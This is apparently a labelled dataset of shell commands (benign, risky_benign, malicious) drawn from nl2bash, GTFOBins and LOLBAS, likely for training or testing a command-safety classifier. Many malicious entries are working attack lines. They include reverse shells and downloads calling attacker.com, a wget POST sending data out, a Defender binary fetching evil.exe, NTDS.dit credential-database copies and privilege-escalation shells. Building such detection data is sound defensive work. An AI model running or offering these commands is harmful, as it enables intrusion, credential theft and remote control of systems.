+{"command": "wireshark", "label": "malicious", "source": "gtfobins", "detail": "wireshark", "id": 884}
+{"command": "elvish", "label": "malicious", "source": "gtfobins", "detail": "elvish", "id": 885}
+{"command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe", "label": "malicious", "source": "lolbas", "detail": "MpCmdRun.exe", "id": 886}
+{"command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "label": "malicious", "source": "lolbas", "detail": "Ttdinject.exe", "id": 887}
+{"command": "find . -name '*.py' -exec grep 'something' {} \\; > output.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 888}
+{"command": "msiexec /z {PATH_ABSOLUTE:.dll}", "label": "malicious", "source": "lolbas", "detail": "Msiexec.exe", "id": 889}
+{"command": "pixtool.exe launch {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Pixtool.exe", "id": 890}
+{"command": "find /home/exampleuser/ -name \"*conf\" -mtime 3", "label": "benign", "source": "nl2bash", "detail": null, "id": 891}
+{"command": "setcap cap_setuid+ep /path/to/command", "label": "malicious", "source": "gtfobins", "detail": "setcap", "id": 892}
+{"command": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install", "label": "malicious", "source": "gtfobins", "detail": "bundle", "id": 893}
+{"command": "node -e 'process.setuid(0); require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 894}
+{"command": "tar --exclude={*.png,*.mp3,*.wav,.git,node_modules} -Jcf ${target_tarball}  ${source_dirname}", "label": "benign", "source": "nl2bash", "detail": null, "id": 895}
+{"command": "torsocks /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "torsocks", "id": 896}
+{"command": "find . -depth -type d -empty -exec rmdir {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 897}
+{"command": "find . -name '.git' | xargs -n 1 dirname", "label": "benign", "source": "nl2bash", "detail": null, "id": 898}
+{"command": "find . -type f -exec cat {} \\; -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 899}
+{"command": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"]);\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 900}
+{"command": "find . -maxdepth 0 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 901}
+{"command": "tmate -c /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "tmate", "id": 902}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "jrunscript", "id": 903}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "wget", "id": 904}
+{"command": "sftp -o ProxyCommand=\"{CMD}\" .", "label": "malicious", "source": "lolbas", "detail": "Sftp.exe", "id": 905}
+{"command": "xbootmgr.exe -trace \"{boot|hibernate|standby|shutdown|rebootCycle}\" -preTraceCmd {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "XBootMgr.exe", "id": 906}
+{"command": "taskset 1 /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "taskset", "id": 907}
+{"command": "hg --config alias.x='!/bin/sh' x", "label": "malicious", "source": "gtfobins", "detail": "hg", "id": 908}
+{"command": "squirrel.exe --updateRollback={REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Squirrel.exe", "id": 909}
+{"command": "echo 'exec /bin/sh 0<&1' >/path/to/temp-file\nchmod +x /path/to/temp-file\ngtester -q /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "gtester", "id": 910}
+{"command": "cdb.exe -pd -pn {process_name}\n.shell {CMD}", "label": "malicious", "source": "lolbas", "detail": "Cdb.exe", "id": 911}
+{"command": "ed /path/to/output-file\na\nDATA\n.\nw\nq", "label": "malicious", "source": "gtfobins", "detail": "ed", "id": 912}
+{"command": "find . -type f | xargs ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 913}
+{"command": "byebug --no-stop /path/to/script.rb", "label": "malicious", "source": "gtfobins", "detail": "byebug", "id": 914}
+{"command": "echo 'CALL \"SYSTEM\" USING \"/bin/sh\".' >/path/to/temp-file\ncobc -xFj --frelax-syntax-checks /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "cobc", "id": 915}
+{"command": "find . -print | xargs ls -gilds", "label": "benign", "source": "nl2bash", "detail": null, "id": 916}
+{"command": "echo DATA >/path/to/temp-file\ndocker cp /path/to/temp-file $CONTAINER_ID:temp-file\ndocker cp $CONTAINER_ID /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "docker", "id": 917}
+{"command": "php -r '$c=file_get_contents(\"http://attacker.com/path/to/input-file\"); file_put_contents(\"/path/to/output-file\", $c);'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 918}
+{"command": "find . -mmin 60 | xargs '-rd\\n' ls -l", "label": "benign", "source": "nl2bash", "detail": null, "id": 919}
+{"command": "touch Gemfile\nbundle console", "label": "malicious", "source": "gtfobins", "detail": "bundle", "id": 920}
+{"command": "scp user@attacker.com:/path/to/input-file /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "scp", "id": 921}
+{"command": "find /tmp/ -exec ls \"{}\" +", "label": "benign", "source": "nl2bash", "detail": null, "id": 922}
+{"command": "find -iname september", "label": "benign", "source": "nl2bash", "detail": null, "id": 923}
+{"command": "echo *.txt | xargs gzip -9", "label": "benign", "source": "nl2bash", "detail": null, "id": 924}
+{"command": "myVar=$(tee)", "label": "benign", "source": "nl2bash", "detail": null, "id": 925}
+{"command": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet", "label": "malicious", "source": "lolbas", "detail": "wbadmin.exe", "id": 926}
+{"command": "cat allFolders.txt | xargs -n 1 cp fileName.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 927}
+{"command": "esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o", "label": "malicious", "source": "lolbas", "detail": "Esentutl.exe", "id": 928}
+{"command": "ssh-keygen -t ed25519 -C 'ci-deploy-key'", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 929}
+{"command": "sort --random-sort $FILE | head -n 1", "label": "benign", "source": "nl2bash", "detail": null, "id": 930}
+{"command": "sg root", "label": "malicious", "source": "gtfobins", "detail": "sg", "id": 931}
+{"command": "echo DATA >/path/to/temp-file\nlwp-download file:///path/to/temp-file /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "lwp-download", "id": 932}
+{"command": "find /path/to/base/dir -type d -print0 | xargs -0 chmod 755", "label": "benign", "source": "nl2bash", "detail": null, "id": 933}
+{"command": "mkdir aaa", "label": "benign", "source": "nl2bash", "detail": null, "id": 934}
+{"command": "diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 935}
+{"command": "find . type -f -amin -2", "label": "benign", "source": "nl2bash", "detail": null, "id": 936}
+{"command": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'", "label": "malicious", "source": "gtfobins", "detail": "gawk", "id": 937}
+{"command": "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'", "label": "malicious", "source": "gtfobins", "detail": "msgfilter", "id": 938}
+{"command": "valgrind /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "valgrind", "id": 939}
+{"command": "find . -type f \\( -name \"*.shtml\" -o -name \"*.css\" \\) -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 940}
+{"command": "bash.exe", "label": "malicious", "source": "lolbas", "detail": "Bash.exe", "id": 941}
+{"command": "find . -name 'my*' -type f -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 942}
+{"command": "setres.exe -w 800 -h 600", "label": "malicious", "source": "lolbas", "detail": "Setres.exe", "id": 943}
+{"command": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM", "label": "malicious", "source": "lolbas", "detail": "Rpcping.exe", "id": 944}
+{"command": "Sqlps.exe -noprofile", "label": "malicious", "source": "lolbas", "detail": "Sqlps.exe", "id": 945}
+{"command": "find /lib/modules/`uname -r` -regex .*perf.*", "label": "benign", "source": "nl2bash", "detail": null, "id": 946}
+{"command": "xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Xwizard.exe", "id": 947}
+{"command": "ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com", "label": "malicious", "source": "gtfobins", "detail": "ssh-copy-id", "id": 948}
+{"command": "env | grep ipo | awk 'BEGIN {FS=\"=\"} ; { print $1 } '", "label": "benign", "source": "nl2bash", "detail": null, "id": 949}
+{"command": "unshare -r /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "unshare", "id": 950}
+{"command": "find -maxdepth 1 -name '*.sql' -exec sed -e 's/ , );/1,1);/g' '{}' | mysql -D ootp", "label": "benign", "source": "nl2bash", "detail": null, "id": 951}
+{"command": "is_nullglob=$( shopt -s | egrep -i '*nullglob' )", "label": "benign", "source": "nl2bash", "detail": null, "id": 952}
+{"command": "sort -nrk 2,2", "label": "benign", "source": "nl2bash", "detail": null, "id": 953}
+{"command": "rundll32.exe zipfldr.dll,RouteTheCall {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Zipfldr.dll", "id": 954}
+{"command": "cat file | xclip -selection clipboard", "label": "benign", "source": "nl2bash", "detail": null, "id": 955}
+{"command": "find . -type l | while read f; do /bin/cp -rf --remove-destination -f $(find . -name $(readlink \"${f}\")) \"${f}\";done;", "label": "benign", "source": "nl2bash", "detail": null, "id": 956}
+{"command": "tree -p", "label": "benign", "source": "nl2bash", "detail": null, "id": 957}
+{"command": "find . -name \"file.ext\"| grep \"FooBar\" | xargs -i cp -p \"{}\" .", "label": "benign", "source": "nl2bash", "detail": null, "id": 958}
+{"command": "find . -name __temp__* -exec rm -rf '{}' \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 959}
+{"command": "odbcconf -f {PATH:.rsp}", "label": "malicious", "source": "lolbas", "detail": "Odbcconf.exe", "id": 960}
+{"command": "bash -p -c 'echo \"$(</path/to/input-file)\"'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 961}
+{"command": "socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 962}
+{"command": "cal -3", "label": "benign", "source": "nl2bash", "detail": null, "id": 963}
+{"command": "ifconfig eth0 down", "label": "benign", "source": "nl2bash", "detail": null, "id": 964}
+{"command": "find -inum 117672808 -exec rm {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 965}
+{"command": "systemctl stop postgresql && rm -rf /var/lib/postgresql/14/main && systemctl start postgresql", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 966}
+{"command": "msgconv -P /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "msgconv", "id": 967}
+{"command": "df -Ph | column -t", "label": "benign", "source": "nl2bash", "detail": null, "id": 968}
+{"command": "ss -a -F /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "ss", "id": 969}
+{"command": "make clean && make -j8", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 970}
+{"command": "ksshell -i /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "ksshell", "id": 971}
+{"command": "find var/ -type d -exec chmod 700 {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 972}
+{"command": "find /usr -group staff", "label": "benign", "source": "nl2bash", "detail": null, "id": 973}
+{"command": "find . -name .svn |xargs rm -rf", "label": "benign", "source": "nl2bash", "detail": null, "id": 974}
+{"command": "echo '...' >/path/to/temp-file\nnmap --script=/path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "nmap", "id": 975}
+{"command": "find ~/code -type d | sed '/\\/\\\\./d' | tr '\\n' ':' | sed 's/:$//'", "label": "benign", "source": "nl2bash", "detail": null, "id": 976}
+{"command": "doFirst= true", "label": "benign", "source": "nl2bash", "detail": null, "id": 977}
+{"command": "find . -name \"*.txt\" -type f -print | xargs file | grep \"foo=\" | cut -d: -f1", "label": "benign", "source": "nl2bash", "detail": null, "id": 978}
+{"command": "irb\n...", "label": "malicious", "source": "gtfobins", "detail": "irb", "id": 979}
+{"command": "find /path ! -perm /022", "label": "benign", "source": "nl2bash", "detail": null, "id": 980}
+{"command": "find . -name \"*.fq.gz\"  -exec gunzip -c  '{}' ';' | fastqc  /dev/stdin", "label": "benign", "source": "nl2bash", "detail": null, "id": 981}
+{"command": "rundll32 \"{PATH}:ADSDLL.dll\",DllMain", "label": "malicious", "source": "lolbas", "detail": "Rundll32.exe", "id": 982}
+{"command": "find -type d -empty -exec rmdir -vp --ignore-fail-on-non-empty {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 983}
+{"command": "find ./ -type f -name \"*.php\"  | xargs -r rename \"s/php/html/\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 984}
+{"command": "regini.exe {PATH}:hidden.ini", "label": "malicious", "source": "lolbas", "detail": "Regini.exe", "id": 985}
+{"command": "find /path/to/someDirectory -type d -print0 | xargs -0 sudo chmod 755", "label": "benign", "source": "nl2bash", "detail": null, "id": 986}
+{"command": "find dir -name \\*~ | xargs echo rm | ksh -s", "label": "benign", "source": "nl2bash", "detail": null, "id": 987}
+{"command": "php -r 'file_put_contents(\"/path/to/output-file\", \"DATA\");'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 988}
+{"command": "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "kubectl", "id": 989}
+{"command": "find / -type f -name dummy 2>/dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 990}
+{"command": "docker system prune -af", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 991}
+{"command": "tclsh\nload /path/to/lib.so x", "label": "malicious", "source": "gtfobins", "detail": "tclsh", "id": 992}
+{"command": "git whatchanged --all | \\grep \"\\.\\.\\.\" | cut -d' ' -f5- | cut -f2- | sort | uniq -c | sort", "label": "benign", "source": "nl2bash", "detail": null, "id": 993}
+{"command": "fastfetch --file /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "fastfetch", "id": 994}
+{"command": "find $dir_name -size $sizeFile -printf '%M %n %u %g %s %Tb %Td %Tk:%TM %p\\n'", "label": "benign", "source": "nl2bash", "detail": null, "id": 995}
+{"command": "ifconfig | grep -Eo 'inet (addr:)?([0-9]*\\.){3}[0-9]*' | grep -Eo '([0-9]*\\.){3}[0-9]*' | grep -v '127.0.0.1'", "label": "benign", "source": "nl2bash", "detail": null, "id": 996}
+{"command": "ifconfig | awk -F':' '/inet addr/&&!/127.0.0.1/{split($2,_,\" \");print _[1]}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 997}
+{"command": "vim -c ':py ...'", "label": "malicious", "source": "gtfobins", "detail": "nvim", "id": 998}
+{"command": "find . -name '*shp*'   -execdir mv '{}/*' shp_all ';'", "label": "benign", "source": "nl2bash", "detail": null, "id": 999}
+{"command": "print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}", "label": "malicious", "source": "lolbas", "detail": "Print.exe", "id": 1000}
+{"command": "find . -name \"filename\" -and -not -path \"*/myfolder/filename\" -delete", "label": "benign", "source": "nl2bash", "detail": null, "id": 1001}
+{"command": "jtag --interactive\nshell /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "jtag", "id": 1002}
+{"command": "find .git -type f -print0 | xargs -0 sed -i 's/subdomainB\\.example\\.com/subdomainA.example.com/g'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1003}
+{"command": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE:.bat}", "label": "malicious", "source": "lolbas", "detail": "Expand.exe", "id": 1004}
+{"command": "head -1 table | tr -s ' ' '\\n' | nl -nln |  grep \"Target\" | cut -f1", "label": "benign", "source": "nl2bash", "detail": null, "id": 1005}
+{"command": "uv run /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "uv", "id": 1006}
+{"command": "cat $FILES | md5sum", "label": "benign", "source": "nl2bash", "detail": null, "id": 1007}
+{"command": "latex --shell-escape '\\immediate\\write18{/bin/sh}'", "label": "malicious", "source": "gtfobins", "detail": "latex", "id": 1008}
+{"command": "echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file\nminicom -D /dev/null -S /path/to/temp-file\nreset^J", "label": "malicious", "source": "gtfobins", "detail": "minicom", "id": 1009}
+{"command": "find dir/ -name '*.txt' | tar -c --files-from=- | bzip2 > dir_txt.tar.bz2", "label": "benign", "source": "nl2bash", "detail": null, "id": 1010}
+{"command": "find . ! -name \"node_modules\" -type d", "label": "benign", "source": "nl2bash", "detail": null, "id": 1011}
+{"command": "telnet\n!/bin/sh", "label": "malicious", "source": "gtfobins", "detail": "telnet", "id": 1012}
+{"command": "read -rep $'Please Enter a Message:\\n' message", "label": "benign", "source": "nl2bash", "detail": null, "id": 1013}
+{"command": "LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts", "label": "malicious", "source": "gtfobins", "detail": "less", "id": 1014}
+{"command": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat", "label": "malicious", "source": "lolbas", "detail": "Expand.exe", "id": 1015}
+{"command": "InstallUtil.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Installutil.exe", "id": 1016}
+{"command": "who am i --ips|awk '{print $5}' #ubuntu 14", "label": "benign", "source": "nl2bash", "detail": null, "id": 1017}
+{"command": "find . -not -name \"*.exe\" -not -name \"*.dll\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1018}
+{"command": "find /etc -exec grep '[0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*[.][0-9][0-9]*' {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1019}
+{"command": "scp.exe -o ProxyCommand=\"{CMD}\" . localhost:.", "label": "malicious", "source": "lolbas", "detail": "scp.exe", "id": 1020}
+{"command": "groups a b c d", "label": "benign", "source": "nl2bash", "detail": null, "id": 1021}
+{"command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}", "label": "malicious", "source": "lolbas", "detail": "Esentutl.exe", "id": 1022}
+{"command": "more /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "more", "id": 1023}
+{"command": "find / -path /proc -prune -o -nouser -o -nogroup", "label": "benign", "source": "nl2bash", "detail": null, "id": 1024}
+{"command": "logger.exe RUN \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Logger.exe", "id": 1025}
+{"command": "join -a 2 /dev/null /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "join", "id": 1026}
+{"command": "dmesg -H", "label": "malicious", "source": "gtfobins", "detail": "dmesg", "id": 1027}
+{"command": "find . -uid 0 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1028}
+{"command": "hostname  -I | awk -F\" \" '{print $1}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1029}
+{"command": "mv * /tmp/blah/", "label": "benign", "source": "nl2bash", "detail": null, "id": 1030}
+{"command": "wget --post-data=DATA http://attacker.com", "label": "malicious", "source": "gtfobins", "detail": "wget", "id": 1031}
+{"command": "bash -p -c 'enable -f /path/to/lib.so x'", "label": "malicious", "source": "gtfobins", "detail": "ksh", "id": 1032}
+{"command": "su - jetty ./runprogram.sh", "label": "benign", "source": "nl2bash", "detail": null, "id": 1033}
+{"command": "diskshadow> exec {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Diskshadow.exe", "id": 1034}
+{"command": "ip netns add foo\nip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar\nip netns exec bar /bin/sh\nip netns delete foo\nip netns delete bar", "label": "malicious", "source": "gtfobins", "detail": "ip", "id": 1035}
+{"command": "truncate -s 0 app.log", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1036}
+{"command": "find /home/user/demo -type f -perm 777 -print -exec chmod 755 {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1037}
+{"command": "find . -size -10k", "label": "benign", "source": "nl2bash", "detail": null, "id": 1038}
+{"command": "gcc -x c -E /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "g++", "id": 1039}
+{"command": "rsync -az --delete /mnt/data/ /media/WD_Disk_1/current_working_data/;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1040}
+{"command": "cipher.exe /e {PATH_ABSOLUTE}", "label": "malicious", "source": "lolbas", "detail": "Cipher.exe", "id": 1041}
+{"command": "find ~ -name myletter.doc -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1042}
+{"command": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff", "label": "malicious", "source": "gtfobins", "detail": "nroff", "id": 1043}
+{"command": "find A \\! -path \"A/a/*\" -a \\! -path \"A/a\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1044}
+{"command": "find . ! -readable -prune", "label": "benign", "source": "nl2bash", "detail": null, "id": 1045}
+{"command": "fzf --bind 'enter:execute(/bin/sh)'", "label": "malicious", "source": "gtfobins", "detail": "fzf", "id": 1046}
+{"command": "tmux new -d \"bash -c '$CMD'\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1047}
+{"command": "find /home/john/script -name \"*.sh\" -type f -exec chmod 644 {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1048}
+{"command": "find . -name [ab]* -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1049}
+{"command": "socat - exec:/bin/sh,pty,ctty,raw,echo=0", "label": "malicious", "source": "gtfobins", "detail": "socat", "id": 1050}
+{"command": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav\nreset^J", "label": "malicious", "source": "gtfobins", "detail": "ffmpeg", "id": 1051}
+{"command": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 1052}
+{"command": "find / -type f ! -perm 777", "label": "benign", "source": "nl2bash", "detail": null, "id": 1053}
+{"command": "Update.exe --updateRollback={PATH_SMB:folder}", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 1054}
+{"command": "RESTIC_PASSWORD_COMMAND='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' restic backup", "label": "malicious", "source": "gtfobins", "detail": "restic", "id": 1055}
+{"command": "find . -name \"*.rb\" -type f -exec chmod 600 {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1056}
+{"command": "rm -f A*.pdf", "label": "benign", "source": "nl2bash", "detail": null, "id": 1057}
+{"command": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "label": "malicious", "source": "lolbas", "detail": "Diantz.exe", "id": 1058}
+{"command": "WMIC.exe /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState", "label": "malicious", "source": "lolbas", "detail": "Wmic.exe", "id": 1059}
+{"command": "vim -c ':redir! >/path/to/output-file | echo \"DATA\" | redir END | q'", "label": "malicious", "source": "gtfobins", "detail": "view", "id": 1060}
+{"command": "find /path/to/files -iname '*.jpg' -exec mogrify -format pdf {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 1061}
+{"command": "find . -user root -perm -4000 -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1062}
+{"command": "basename /path/to/dir/filename.txt .txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 1063}
+{"command": "echo \"a,b\"|sed 's/,/\\r\\n/'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1064}
+{"command": "yes '' | ruby -e \"$(curl -fsSL https://raw.github.com/Homebrew/homebrew/go/install)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1065}
+{"command": "echo \"fifo forever\" | cat - fifo | tee fifo", "label": "benign", "source": "nl2bash", "detail": null, "id": 1066}
+{"command": "TODAY=$(date  -d \"$(date +%F)\" +%s)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1067}
+{"command": "alias foo=\"printf\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1068}
+{"command": "size=\"$(zcat \"$file\" | wc -c)\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1069}
+{"command": "winget.exe install --accept-package-agreements -s msstore {name or ID}", "label": "malicious", "source": "lolbas", "detail": "winget.exe", "id": 1070}
+{"command": "find */201111/* -name \"*.jpg\" | sort -t '_' -nk2", "label": "benign", "source": "nl2bash", "detail": null, "id": 1071}
+{"command": "find / -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1072}
+{"command": "ls `which g++` -al", "label": "benign", "source": "nl2bash", "detail": null, "id": 1073}
+{"command": "clisp -x '(ext:run-shell-command \"/bin/sh\")(ext:exit)'", "label": "malicious", "source": "gtfobins", "detail": "clisp", "id": 1074}
+{"command": "VSIISExeLauncher.exe -p {PATH:.exe} -a \"{CMD:args}\"", "label": "malicious", "source": "lolbas", "detail": "VSIISExeLauncher.exe", "id": 1075}
+{"command": "dnf install -y x-1.0-1.noarch.rpm --disablerepo=*", "label": "malicious", "source": "gtfobins", "detail": "dnf", "id": 1076}
+{"command": "grep '' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "grep", "id": 1077}
+{"command": "bash -c 'enable -f /path/to/lib.so x'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 1078}
+{"command": "grep -o . filename | tr '[:upper:]' '[:lower:]' | sort | uniq -c | sort -nr", "label": "benign", "source": "nl2bash", "detail": null, "id": 1079}
+{"command": "coregen.exe dummy_assembly_name", "label": "malicious", "source": "lolbas", "detail": "coregen.exe", "id": 1080}
+{"command": "find . -name *disc*", "label": "benign", "source": "nl2bash", "detail": null, "id": 1081}
+{"command": "split --lines=1 --suffix-length=5 input.txt output.", "label": "benign", "source": "nl2bash", "detail": null, "id": 1082}
+{"command": "perl -e 'exec \"/bin/sh\"'", "label": "malicious", "source": "gtfobins", "detail": "perl", "id": 1083}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "jjs", "id": 1084}
+{"command": "find /home -xdev -samefile file1 -exec rm {} +", "label": "benign", "source": "nl2bash", "detail": null, "id": 1085}
+{"command": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "label": "malicious", "source": "lolbas", "detail": "Zipfldr.dll", "id": 1086}
+{"command": "find / -perm /u=r | head", "label": "benign", "source": "nl2bash", "detail": null, "id": 1087}
+{"command": "find .*", "label": "benign", "source": "nl2bash", "detail": null, "id": 1088}
+{"command": "echo -en '111 22 3\\n4 555 66\\n' | tr ' ' '\\t'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1089}
+{"command": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 1090}
+{"command": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 1091}
+{"command": "find /tmp -name \"*.tmp\" -print0 | xargs -0 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 1092}
+{"command": "reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg {PATH_ABSOLUTE}:evilreg.reg", "label": "malicious", "source": "lolbas", "detail": "Reg.exe", "id": 1093}
+{"command": "julia -e 'open(f->write(f, \"DATA\"), /path/to/output-file, \"w\")'", "label": "malicious", "source": "gtfobins", "detail": "julia", "id": 1094}
+{"command": "echo '/bin/sh 1>&0' >/path/to/temp-file\nchmod +x /path/to/temp-file\necho AC_INIT >configure.ac\nAUTOM4TE=/path/to/temp-file autoreconf", "label": "malicious", "source": "gtfobins", "detail": "autoreconf", "id": 1095}
+{"command": "regasm.exe /U {PATH:.dll}", "label": "malicious", "source": "lolbas", "detail": "Regasm.exe", "id": 1096}
+{"command": "ps aux | grep 'python csp_build.py' | head -1 | tr -s ' ' | cut -d \" \" -f2 | xargs kill", "label": "benign", "source": "nl2bash", "detail": null, "id": 1097}
+{"command": "find . -name \"*.mov\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1098}
